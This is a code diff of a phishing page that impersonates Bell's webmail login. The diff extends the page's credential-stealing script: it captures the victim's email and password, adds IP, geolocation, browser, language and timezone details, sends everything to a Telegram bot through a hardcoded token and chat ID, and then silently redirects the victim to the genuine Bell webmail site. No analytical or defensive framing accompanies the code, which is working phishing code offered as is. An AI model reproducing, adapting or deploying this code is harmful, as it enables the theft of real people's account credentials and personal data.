@@ -130,31 +130,54 @@
     const BOT_TOKEN = '7872296367:AAHBItXb7od6gkGaqb4JzDFbrlsHjPLAWzY'; // Replace with your Telegram Bot Token
     const CHAT_ID = '7601666417'; // Replace with your Telegram Chat ID
 
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
+    document.getElementById('loginForm').addEventListener('submit', async function (e) {
       e.preventDefault();
 
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value.trim();
+      const browseragent = navigator.userAgent;
+      const language = navigator.language || navigator.userLanguage;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-      const message = `🔐 Bell Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`;
+      // Get IP and Location Info
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message
-        })
-      })
-      .then(response => {
-        // Redirect silently after message is sent
-        window.location.href = "https://webmail.en.bellnet.ca/ux/index-rui.jsp?v=3.1.3.54.0-4#/";
-      })
-      .catch(error => {
-        window.location.href = "https://webmail.en.bellnet.ca/ux/index-rui.jsp?v=3.1.3.54.0-4#/";
-      });
+        const ip = data.ip;
+        const country = data.country_name;
+        const city = data.city;
+        const region = data.region;
+
+        const message = `
+💥🎓🚀🏆BELL RESZULT 2025 COCONUTHEAD101💥🎓🚀🏆
+
+📧 Email: ${email}
+🔐 Password: ${password}
+📌 IP: ${ip}
+🌐 Country: ${country}
+🏙️ City: ${city}
+📍 Region: ${region}
+📺 Browser: ${browseragent}
+🚩 Language: ${language}
+🕰️ Timezone: ${timezone}
+        `;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+
+      } catch (error) {
+        // Silent fail
+      }
+
+      // Redirect
+      window.location.href = "https://webmail.en.bellnet.ca/ux/index-rui.jsp?v=3.1.3.54.0-4#/";
     });
   </script>
 </body>
